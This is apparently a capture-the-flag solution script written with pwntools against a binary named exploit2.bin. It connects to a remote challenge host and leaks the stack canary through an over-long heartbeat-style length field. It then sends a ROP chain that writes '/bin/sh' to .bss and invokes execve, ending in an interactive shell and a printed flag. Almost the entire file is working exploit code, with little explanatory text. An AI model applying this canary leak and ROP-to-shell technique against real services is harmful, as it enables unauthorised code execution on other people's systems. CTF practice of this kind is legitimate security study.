# %%

from pwn import *

# %%

# ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=2225439fe6f084b9baea4c6a07e31d32109da59d, for GNU/Linux 3.2.0, not stripped

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# %%

# objdump -d ./src/exploit2.bin > objdump.txt
# ROPgadget --binary ./src/exploit2.bin > rop.txt
# strings ./src/exploit2.bin > strings.txt
# one_gadget ./src/exploit2.bin > one_gadget.txt

# 0x00000000004018e2 : pop rdi ; ret
# 0x000000000040f30e : pop rsi ; ret
# 0x00000000004017ef : pop rdx ; ret
# 0x000000000049c1fb : pop rdx ; pop rbx ; ret
# 0x000000000043c403 : mov qword ptr [rdi], rdx ; ret
# 0x0000000000451fd7 : pop rax ; ret
# 0x000000000040101a: ret
# 0x00000000004012e3 : syscall

pop_rdi = 0x00000000004018e2
pop_rsi = 0x000000000040f30e
pop_rdx_rbx = 0x000000000049c1fb
mov_q_prdi_rdx = 0x000000000043c403
pop_rax = 0x0000000000451fd7

ret = 0x000000000040101a
syscall = 0x00000000004012e3

# (gdb) info files
#         0x00000000004e1240 - 0x00000000004e29f8 is .bss

bin_sh = u64(b"/bin/sh\x00")
bss = 0x00000000004e1240

# %%

context.arch = "amd64"
context.terminal = ["tmux", "splitw", "-h"]

argv = ['./src/exploit2.bin']

gdbscript = 'gef\ngef\n'
gdbscript += 'set follow-fork-mode child\n'
gdbscript += 'b main\n'

# conn = gdb.debug(argv, gdbscript)

conn = remote('34.123.210.162', 20233)
# conn = process(argv)

# _pid = gdb.attach(conn, gdbscript)

# %%

print("1")
conn.recvuntil(b"Waiting for heart beat request...\n")

payload = str(1032 + 8).encode() + b':' + b'a' * 1032
print(f"{payload = }")

print("2")
conn.sendline(payload)

print("3")
conn.recvuntil(b"Sending heart beat response...\n")

a = conn.recvline().strip()
canary = u64(a[-8:])
print(f"{hex(canary) = }")

rop_chain = flat({
    0:
    b"a\x00",
    # --- canary --- #
    1032:
    canary,
    # --- rbp --- #
    # flat will help pad here
    # --- return addr --- #
    1048: [
        # ------ #
        #
        pop_rdi,
        bss,
        pop_rdx_rbx,
        bin_sh,
        0,
        mov_q_prdi_rdx,
        # ------ #
        #
        pop_rdi,
        bss,
        pop_rsi,
        0,
        pop_rdx_rbx,
        0,
        0,
        pop_rax,
        59,
        syscall,
        #
        0,
    ],
})

_size = len(rop_chain)
payload = str(_size).encode() + b':' + rop_chain
print(f"{payload = }")

print("4")
conn.recvuntil(b"Waiting for heart beat request...\n")

print("5")
conn.sendline(payload)

print("6")
conn.recvuntil(b"Waiting for heart beat request...\n")

print("7")
conn.sendline(b"0:")

print("8")
conn.interactive()

# poctf{uwsp_4_57udy_1n_5c42137}
